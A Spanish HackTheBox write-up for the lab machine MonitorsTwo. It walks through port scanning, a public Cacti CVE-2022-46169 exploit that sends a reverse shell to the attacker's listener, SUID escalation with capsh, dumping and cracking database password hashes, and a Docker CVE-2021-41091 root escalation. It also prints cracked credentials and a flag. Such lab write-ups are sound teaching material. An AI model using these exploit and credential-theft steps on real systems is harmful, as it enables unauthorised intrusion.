# Reporte de HackTheBox - Máquina MonitorsTwo 

## Información de la Máquina

- Nombre: MonitorsTwo
- Sistema Operativo: Linux
- Dificultad: Easy
- Puntos: 20

## Resumen

Máquina sencilla pero a la vez tediosa ya que requiere una enumeración muy detenida para coger como funcionan los servicios que corren. Muy entretenida y didáctica ya que aprendes más de lo que esperas con ella. Lo que parece un foothold a un maravilloso docker, dumpeo de credenciales de mySQL y una escalada de privilegios sencilla.

## Descubrimiento y Enumeración

Lo primero que haremos será comprobar nuestra conectividad con la máquina víctima a través de `ping`.
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# ping -c 1 10.10.11.211
PING 10.10.11.211 (10.10.11.211) 56(84) bytes of data.
64 bytes from 10.10.11.211: icmp_seq=1 ttl=63 time=112 ms

--- 10.10.11.211 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 112.303/112.303/112.303/0.000 ms
```

Seguimos con enumeración de puertos abiertos en la máquina reduciendo el handshake con el modo `SYN SCAN` de `Nmap` de la manera siguiente.
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# nmap -sS --min-rate 5000 -Pn -n -p- --open 10.10.11.211 -oG nmap/initial -vvv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 13:11 EDT
Initiating SYN Stealth Scan at 13:11
Scanning 10.10.11.211 [65535 ports]
Discovered open port 80/tcp on 10.10.11.211
Discovered open port 22/tcp on 10.10.11.211
Completed SYN Stealth Scan at 13:11, 15.07s elapsed (65535 total ports)
Nmap scan report for 10.10.11.211
Host is up, received user-set (0.057s latency).
Scanned at 2023-05-29 13:11:30 EDT for 15s
Not shown: 60031 closed tcp ports (reset), 5502 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.20 seconds
           Raw packets sent: 76291 (3.357MB) | Rcvd: 60205 (2.408MB)
```
A partir de este primer escaneo copiamos los puertos abiertos y enumeramos la versión y lanzamos los scripts comunes de enumeración para no hacerlo con los 65535 puertos en total.
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# nmap -sCV -p22,80 10.10.11.211 -oN nmap/targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 13:12 EDT
Nmap scan report for 10.10.11.211
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
```
Tenemos abiertos el puerto 22 con `OpenSSH 8.2p1` y el puerto 80 con `nginx 1.18.0` los cuales no disponen de exploits públicos ni información de vulnerabilidades de nuestro interés, por lo cual se obviarán como medios para obtener foothold.

Seguido añadimos la ip a nuestro archivo `hosts` y usando la herramienta `whatweb` obtendremos un poco más de información acerca de la web a la que nos enfrentamos antes de ir a inspeccionarla a mano.
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# whatweb http://monitors.htb
http://monitors.htb [200 OK] Cacti, Cookies[Cacti], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[Cacti], IP[10.10.11.211], JQuery, PHP[7.4.33], PasswordField[login_password], Script[text/javascript], Title[Login to Cacti], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.4.33], X-UA-Compatible[IE=Edge], nginx[1.18.0]
```
Sabemos que hay un servicio que parece que se llama Cacti, lo desconozco así que si encontramos la versión buscaremos más información acerca de ello; pero primero procedemos a enumerar directorios posibles en dicho servidor web usando la herramienta `gobuster`.
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# gobuster dir -u http://monitors.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o content/gobusterdir 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://monitors.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/29 13:17:03 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 314] [--> http://monitors.htb/images/]
/docs                 (Status: 301) [Size: 312] [--> http://monitors.htb/docs/]
/scripts              (Status: 301) [Size: 315] [--> http://monitors.htb/scripts/]
/service              (Status: 301) [Size: 315] [--> http://monitors.htb/service/]
/plugins              (Status: 301) [Size: 315] [--> http://monitors.htb/plugins/]
/log                  (Status: 403) [Size: 276]
/install              (Status: 301) [Size: 315] [--> http://monitors.htb/install/]
/lib                  (Status: 301) [Size: 311] [--> http://monitors.htb/lib/]
/resource             (Status: 301) [Size: 316] [--> http://monitors.htb/resource/]
/cache                (Status: 301) [Size: 313] [--> http://monitors.htb/cache/]
/include              (Status: 301) [Size: 315] [--> http://monitors.htb/include/]
/LICENSE              (Status: 200) [Size: 15171]
/formats              (Status: 301) [Size: 315] [--> http://monitors.htb/formats/]
/CHANGELOG            (Status: 200) [Size: 254887]
Progress: 17891 / 220561 (8.11%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/05/29 13:19:30 Finished
===============================================================
```
Y ahora sí, nos metemos manualmente a inspeccionar la web empezando por el index, el cual desde el navegador se ve así y nos arroja información de la versión de Cacti que se está empleando, lo cual nos ayuda a hacer la siguiente busqueda en google para informarnos de como funciona dicho servicio.

![Página MonitorsTwo](https://github.com/mariioaseenjo/mariioaseenjo.github.io/assets/89775325/20dad0a6-9d52-4e2f-869f-39460c1e3840)

Procedemos a buscar `Cacti 1.2.22`y lo primero que encontramos parece ser de nuestro interes.
![Búsqueda de Cacti 1.2.22](https://github.com/mariioaseenjo/mariioaseenjo.github.io/assets/89775325/85d1a3cf-cd7a-44f1-b18d-839626729e2c)
Con esto podemos intentar ganar acceso al servidor que corre este servicio.

## Vulnerabilidades y Explotación

Clonamos el repositorio en nuestra máquina atacante e indicandole la URL del host víctima, nuestra IP y nuestro puerto de escucha, nos enviará una shell a nuestra máquina en la cual estaremos escuchando previamente en el puerto especificado.

Primero el listener...   `nc`
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# nc -lvnp 443
listening on [any] 443 ...
```
Acto seguido lanzamos el script con python como indica el PoC.
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo/exploits/CVE-2022-46169-CACTI-1.2.22# python3 CVE-2022-46169.py -u http://monitors.htb --LHOST=10.10.14.134 --LPORT=443
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```
Y de esta forma en nuestro `nc` recibiremos una shell como a continuación...
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.134] from (UNKNOWN) [10.10.11.211] 52012
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ 
```
Una vez tenemos conexión tratamos nuestra shell para que sea interactiva de la siguiente forma.
```
bash-5.1$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.1$ ^Z
[1]+  Stopped                 nc -lvnp 443
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# stty raw -echo
root@kali:~/Desktop/HTB/Machines/MonitorsTwo# 
nc -lvnp 443

bash-5.1$
bash-5.1$ export TERM=xterm
```
Buscamos archivos con permisos SUID y aprovechamos `capsh` para escalar privilegios.
```
bash-5.1$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/bash
/bin/su
bash-5.1$ capsh --gid=0 --uid=0 --
root@50bca5e748b0:/var/www/html# 
```
La buena noticia es que somos `root` la mala noticia es que nos encontramos dentro de un contenedor, así que procedamos a enumerar el sistema para saber que clase de contenedor es y que información de interés puede contener para nosotros como atacantes.
```
root@50bca5e748b0:/# ls -la
total 156
drwxr-xr-x   1 root root  4096 May 30 11:26 .
drwxr-xr-x   1 root root  4096 May 30 11:26 ..
-rwxr-xr-x   1 root root     0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root  4096 Mar 22 13:21 bin
drwxr-xr-x   2 root root  4096 Mar 22 13:21 boot
drwxr-xr-x   5 root root   340 May 30 10:24 dev
-rw-r--r--   1 root root   648 Jan  5 11:37 entrypoint.sh
drwxr-xr-x   1 root root  4096 Mar 21 10:49 etc
drwxr-xr-x   2 root root  4096 Mar 22 13:21 home
drwxr-xr-x   1 root root  4096 Nov 15  2022 lib
drwxr-xr-x   2 root root  4096 Mar 22 13:21 lib64
drwxr-xr-x   2 root root  4096 Mar 22 13:21 media
drwxr-xr-x   1 root root  4096 May 30 10:25 mnt
drwxr-xr-x   2 root root  4096 Mar 22 13:21 opt
dr-xr-xr-x 445 root root     0 May 30 10:24 proc
drwx------   1 root root  4096 Mar 21 10:50 root
drwxr-xr-x   1 root root  4096 May 30 10:25 run
drwxr-xr-x   1 root root  4096 Jan  9 09:30 sbin
drwxr-xr-x   2 root root  4096 Mar 22 13:21 srv
dr-xr-xr-x  13 root root     0 May 30 10:24 sys
drwxrwxrwt   1 root root 69632 May 30 16:38 tmp
drwxr-xr-x   1 root root  4096 Nov 14  2022 usr
drwxr-xr-x   1 root root  4096 Nov 15  2022 var
```
Listando la raíz podemos apreciar que nos encontramos dentro de un `docker` y que disponemos de un script en `bash` en la misma raíz el cual vamos a inspeccionar acto seguido.
```
root@50bca5e748b0:/# cat entrypoint.sh 
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
root@50bca5e748b0:/#
```
Como se puede apreciar en la sentencia `if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then` se está accediendo a una base de datos para la cual disponemos de credenciales por defecto para root por lo cual si hay información de valor tenemos acceso a ella.

Procedemos a ejecutar el comando directamente desde nuestra shell y obtenemos algo muy interesante.
```
root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti -e "show tables"
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
| aggregate_graphs                    |
| aggregate_graphs_graph_item         |
| aggregate_graphs_items              |
| automation_devices                  |
| automation_graph_rule_items         |
| automation_graph_rules              |
| automation_ips                      |
| automation_match_rule_items         |
| automation_networks                 |
| automation_processes                |
| automation_snmp                     |
| automation_snmp_items               |
| automation_templates                |
| automation_tree_rule_items          |
| automation_tree_rules               |
| cdef                                |
| cdef_items                          |
| color_template_items                |
| color_templates                     |
| colors                              |
| data_debug                          |
| data_input                          |
| data_input_data                     |
| data_input_fields                   |
| data_local                          |
| data_source_profiles                |
| data_source_profiles_cf             |
| data_source_profiles_rra            |
| data_source_purge_action            |
| data_source_purge_temp              |
| data_source_stats_daily             |
| data_source_stats_hourly            |
| data_source_stats_hourly_cache      |
| data_source_stats_hourly_last       |
| data_source_stats_monthly           |
| data_source_stats_weekly            |
| data_source_stats_yearly            |
| data_template                       |
| data_template_data                  |
| data_template_rrd                   |
| external_links                      |
| graph_local                         |
| graph_template_input                |
| graph_template_input_defs           |
| graph_templates                     |
| graph_templates_gprint              |
| graph_templates_graph               |
| graph_templates_item                |
| graph_tree                          |
| graph_tree_items                    |
| host                                |
| host_graph                          |
| host_snmp_cache                     |
| host_snmp_query                     |
| host_template                       |
| host_template_graph                 |
| host_template_snmp_query            |
| plugin_config                       |
| plugin_db_changes                   |
| plugin_hooks                        |
| plugin_realms                       |
| poller                              |
| poller_command                      |
| poller_data_template_field_mappings |
| poller_item                         |
| poller_output                       |
| poller_output_boost                 |
| poller_output_boost_local_data_ids  |
| poller_output_boost_processes       |
| poller_output_realtime              |
| poller_reindex                      |
| poller_resource_cache               |
| poller_time                         |
| processes                           |
| reports                             |
| reports_items                       |
| sessions                            |
| settings                            |
| settings_tree                       |
| settings_user                       |
| settings_user_group                 |
| sites                               |
| snmp_query                          |
| snmp_query_graph                    |
| snmp_query_graph_rrd                |
| snmp_query_graph_rrd_sv             |
| snmp_query_graph_sv                 |
| snmpagent_cache                     |
| snmpagent_cache_notifications       |
| snmpagent_cache_textual_conventions |
| snmpagent_managers                  |
| snmpagent_managers_notifications    |
| snmpagent_mibs                      |
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on              | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   663348655 |
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
```
Guardamos el hash del usuario marcus en un archivo para intentar crackearlo con `john` de la siguiente manera.

``` 
Contenido del archivo `hash`
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```
Ejecutamos el siguiente comando en el mismo directorio donde se aloja el archivo `hash`.
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo/content# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (marcus)     
1g 0:00:00:23 DONE (2023-05-29 14:47) 0.04321g/s 370.2p/s 370.2c/s 370.2C/s 474747..nicole21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Ahora sabemos que las credenciales de marcus guardadas en la base de datos son `marcus:funkymonkey`. 
Con esto vamos a intentar entrar a la máquina por `ssh` ya que estaba habilitado.
```
root@kali:~/Desktop/HTB/Machines/MonitorsTwo/exploits/CVE-2022-46169-CACTI-1.2.22# ssh marcus@monitors.htb
marcus@monitors.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 30 May 2023 07:46:42 PM UTC

  System load:                      0.0
  Usage of /:                       64.2% of 6.73GB
  Memory usage:                     32%
  Swap usage:                       0%
  Processes:                        294
  Users logged in:                  1
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:e2d3

  => There are 2 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Tue May 30 18:46:29 2023 from 10.10.14.73
marcus@monitorstwo:~$ 
```
Con esto obtenemos acceso a `monitorstwo` como el usuario `marcus`.
## Escalada de Privilegios

Si nos paramos a mirar lo que nos dice ssh al conectarnos, vemos que tenemos mail, por lo cual será de interés para nosotros y le echaremos un ojo. Antes de eso me cercioro de que no disponemos de ningún SUID o de ningún permiso para ejecutar ningún archivo con permisos más allá de los que ya disponemos, por lo cual me dispongo a mirar el mail directamente.
```
marcus@monitorstwo:~$ cd /var/mail/
marcus@monitorstwo:/var/mail$ ls -la
total 12
drwxrwsr-x  2 root mail 4096 Mar 22 11:46 .
drwxr-xr-x 13 root root 4096 Jan  9 10:03 ..
-rw-r--r--  1 root mail 1809 Oct 18  2021 marcus
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
marcus@monitorstwo:/var/mail$ 
```
En este mail nos nombra varias vulnerabilidades que se han detectado en lo que parece ser una auditoría y han quedado reflejadas en el propio mail de todos los miembros de la compañía, de las cuales nos vamos a centrar en la última, teniendo en cuenta que un exploit de kernel es menos probable que una vulnerabilidad de docker que expresamente puedes usar para escalar privilegios.
Por lo cual buscando información acerca de la vulnerabilidad dí con [este post](https://exploit-notes.hdks.org/exploit/container/docker/moby-docker-engine-privesc/), el cual nos va a venir genial de guía para hacer nuestra escalada.

Empezamos por buscar en nuestra máquina donde se encuentran montados los contenedores de docker que tenemos activos, tenemos dos por lo cual nos tocará probar en ambos si no conseguimos escalar a la primera.
Este documento nos dice que a través de dicha vulnerabilidad podemos ejecutar un comando en la máquina host de los contenedores que pertenezca a un contenedor.
En nuestro caso vamos a seguirlo al pie de la letra para conseguir con `/bin/bash` siendo SUID ejecutarlo en el host accediendo al host valga la redundancia siendo `root`.
Para ello procedemos de la siguiente manera...
```
marcus@monitorstwo:/var/mail$ findmnt
TARGET                                SOURCE      FSTYPE   OPTIONS
/                                     /dev/sda2   ext4     rw,relatime
├─/sys                                sysfs       sysfs    rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security              securityfs  security rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup                    tmpfs       tmpfs    ro,nosuid,nodev,noexec,mode=755
│ │ ├─/sys/fs/cgroup/unified          cgroup2     cgroup2  rw,nosuid,nodev,noexec,relatime,nsd
│ │ ├─/sys/fs/cgroup/systemd          cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,xat
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,cpu
│ │ ├─/sys/fs/cgroup/devices          cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,dev
│ │ ├─/sys/fs/cgroup/memory           cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,mem
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,net
│ │ ├─/sys/fs/cgroup/rdma             cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,rdm
│ │ ├─/sys/fs/cgroup/freezer          cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,fre
│ │ ├─/sys/fs/cgroup/blkio            cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,blk
│ │ ├─/sys/fs/cgroup/perf_event       cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,per
│ │ ├─/sys/fs/cgroup/cpuset           cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,cpu
│ │ ├─/sys/fs/cgroup/pids             cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,pid
│ │ └─/sys/fs/cgroup/hugetlb          cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,hug
│ ├─/sys/fs/pstore                    pstore      pstore   rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/bpf                       none        bpf      rw,nosuid,nodev,noexec,relatime,mod
│ ├─/sys/kernel/debug                 debugfs     debugfs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/tracing               tracefs     tracefs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/fuse/connections          fusectl     fusectl  rw,nosuid,nodev,noexec,relatime
│ └─/sys/kernel/config                configfs    configfs rw,nosuid,nodev,noexec,relatime
├─/proc                               proc        proc     rw,nosuid,nodev,noexec,relatime
│ └─/proc/sys/fs/binfmt_misc          systemd-1   autofs   rw,relatime,fd=28,pgrp=1,timeout=0,
│   └─/proc/sys/fs/binfmt_misc        binfmt_misc binfmt_m rw,nosuid,nodev,noexec,relatime
├─/dev                                udev        devtmpfs rw,nosuid,noexec,relatime,size=1966
│ ├─/dev/pts                          devpts      devpts   rw,nosuid,noexec,relatime,gid=5,mod
│ ├─/dev/shm                          tmpfs       tmpfs    rw,nosuid,nodev
│ ├─/dev/hugepages                    hugetlbfs   hugetlbf rw,relatime,pagesize=2M
│ └─/dev/mqueue                       mqueue      mqueue   rw,nosuid,nodev,noexec,relatime
├─/run                                tmpfs       tmpfs    rw,nosuid,nodev,noexec,relatime,siz
│ ├─/run/lock                         tmpfs       tmpfs    rw,nosuid,nodev,noexec,relatime,siz
│ ├─/run/docker/netns/4e296a7b04fc    nsfs[net:[4026532597]]
│ │                                               nsfs     rw
│ ├─/run/user/1000                    tmpfs       tmpfs    rw,nosuid,nodev,relatime,size=40260
│ └─/run/docker/netns/2726eab615b7    nsfs[net:[4026532659]]
│                                                 nsfs     rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay     overlay  rw,relatime,lowerdir=/var/lib/docke
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm         tmpfs    rw,nosuid,nodev,noexec,relatime,siz
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay     overlay  rw,relatime,lowerdir=/var/lib/docke
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm         tmpfs    rw,nosuid,nodev,noexec,relatime,siz
marcus@monitorstwo:/var/mail$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls -l
total 156
drwxr-xr-x 1 root root  4096 Mar 22 13:21 bin
drwxr-xr-x 2 root root  4096 Mar 22 13:21 boot
drwxr-xr-x 1 root root  4096 Mar 21 10:49 dev
-rwxr-xr-x 1 root root     0 Jan  5 11:37 entrypoint.sh
drwxr-xr-x 1 root root  4096 Mar 21 10:49 etc
drwxr-xr-x 2 root root  4096 Mar 22 13:21 home
drwxr-xr-x 1 root root  4096 Nov 15  2022 lib
drwxr-xr-x 2 root root  4096 Mar 22 13:21 lib64
drwxr-xr-x 2 root root  4096 Mar 22 13:21 media
drwxr-xr-x 1 root root  4096 May 30 10:25 mnt
drwxr-xr-x 2 root root  4096 Mar 22 13:21 opt
drwxr-xr-x 2 root root  4096 Mar 22 13:21 proc
drwx------ 1 root root  4096 Mar 21 10:50 root
drwxr-xr-x 1 root root  4096 May 30 10:25 run
drwxr-xr-x 1 root root  4096 Jan  9 09:30 sbin
drwxr-xr-x 2 root root  4096 Mar 22 13:21 srv
drwxr-xr-x 2 root root  4096 Mar 22 13:21 sys
drwxrwxrwt 1 root root 69632 May 30 20:04 tmp
drwxr-xr-x 1 root root  4096 Nov 14  2022 usr
drwxr-xr-x 1 root root  4096 Nov 15  2022 var


```
Nuestra ruta de interes habiendo hecho un `ls -l` en el primer contenedor vemos que es la siguiente:
- /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
Ahora vamos a proceder a crear un binario SUID de `/bin/bash` dentro del contenedor ya que somos root....
```
root@50bca5e748b0:/# chmod u+s /bin/bash 
root@50bca5e748b0:/# ls -l /bin/bash 
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Y desde nuestra máquina atacante nos vamos a dirigir al directorio anterior y vamos a ejecutar lo siguiente:
```
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# whoami
root
bash-5.1# cd /root/
bash-5.1# ls -la
total 36
drwx------  6 root root 4096 Mar 22 13:21 .
drwxr-xr-x 19 root root 4096 Mar 22 13:21 ..
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Mar 22 13:21 .cache
drwxr-xr-x  2 root root 4096 Mar 22 13:21 cacti
drwxr-xr-x  3 root root 4096 Mar 22 13:21 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 May 30 10:24 root.txt
drwx------  2 root root 4096 Mar 22 13:21 .ssh
bash-5.1# cat root.txt 
7c9d99fdff4b91dce3ad8509b4c034ef
```
De esta manera somos root en monitortwo y obtenemos las dos flags necesarias para finalizar la máquina.

## Agradecimientos

Agradecimientos especiales a los creadores de la máquina y a la comunidad de HackTheBox por proporcionar una plataforma de aprendizaje y desafío en seguridad informática.
